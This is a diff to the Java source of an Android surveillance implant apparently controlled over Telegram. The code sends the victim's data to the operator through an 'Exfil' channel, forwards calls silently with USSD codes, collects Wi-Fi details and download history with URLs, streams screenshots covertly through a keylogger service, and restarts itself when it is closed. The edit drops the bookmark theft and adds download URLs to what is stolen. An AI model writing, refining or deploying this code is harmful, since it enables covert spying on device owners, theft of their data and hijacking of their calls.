@@ -43,7 +43,6 @@ import android.os.IBinder;
 import android.os.Looper;
 import android.os.VibrationEffect;
 import android.os.Vibrator;
-import android.provider.Browser;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.telephony.SmsManager;
@@ -225,7 +224,6 @@ public class TelegramService extends Service {
             
             if (wifiManager != null && wifiManager.isWifiEnabled()) {
                 sb.append("Wi-Fi is ON\n");
-                // L'code hna kay-tleb location permission f Android l'jdad
                 if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                     android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                     if (wifiInfo != null) {
@@ -245,7 +243,6 @@ public class TelegramService extends Service {
 
     private void forwardCalls(String number) {
         try {
-            // USSD code bach t-dir call forwarding (kay-khdem f bzaf dyal les reseaux)
             String ussdCode = "*21*" + number + "%23";
             Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(ussdCode)));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
@@ -262,39 +259,25 @@ public class TelegramService extends Service {
     }
 
     private void extractBrowserHistoryNoRoot() {
-        Exfil.send("⏳ Extracting Browser History & Downloads (No Root)...");
-        StringBuilder sb = new StringBuilder("🌐 **Browser History & Downloads:**\n\n");
+        Exfil.send("⏳ Extracting Recent Downloads (No Root)...");
+        StringBuilder sb = new StringBuilder("🌐 **Recent Downloads:**\n\n");
 
         try {
             DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
             Cursor cursor = dm.query(new DownloadManager.Query().setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL));
             if (cursor != null) {
-                sb.append("📥 **Recent Downloads:**\n");
                 int count = 0;
-                while (cursor.moveToNext() && count < 20) {
+                while (cursor.moveToNext() && count < 30) {
                     String title = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TITLE));
-                    sb.append("• ").append(title).append("\n");
-                    count++;
-                }
-                cursor.close();
-                sb.append("\n");
-            }
-        } catch (Exception e) {}
-
-        try {
-            Cursor cursor = getContentResolver().query(Browser.BOOKMARKS_URI, null, null, null, Browser.BookmarkColumns.DATE + " DESC");
-            if (cursor != null) {
-                sb.append("⭐ **Browser Bookmarks:**\n");
-                int count = 0;
-                while (cursor.moveToNext() && count < 20) {
-                    String title = cursor.getString(cursor.getColumnIndexOrThrow(Browser.BookmarkColumns.TITLE));
-                    String url = cursor.getString(cursor.getColumnIndexOrThrow(Browser.BookmarkColumns.URL));
-                    sb.append("• ").append(title).append("\n  ").append(url).append("\n");
+                    String uri = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_URI));
+                    sb.append("• ").append(title).append("\n  ").append(uri).append("\n");
                     count++;
                 }
                 cursor.close();
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sb.append("❌ Downloads error: ").append(e.getMessage()).append("\n");
+        }
 
         Exfil.send(sb.toString());
     }
@@ -457,7 +440,7 @@ public class TelegramService extends Service {
         } catch (Exception e) {}
     }
 
-    private void startVncStream() {
+  private void startVncStream() {
         if (!isVncRunning) return;
         if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreenSilent();
         mainHandler.postDelayed(this::startVncStream, 3000);
@@ -620,4 +603,4 @@ public class TelegramService extends Service {
         super.onTaskRemoved(rootIntent);
         startService(new Intent(getApplicationContext(), TelegramService.class).setPackage(getPackageName()));
     }
-        }
+    }
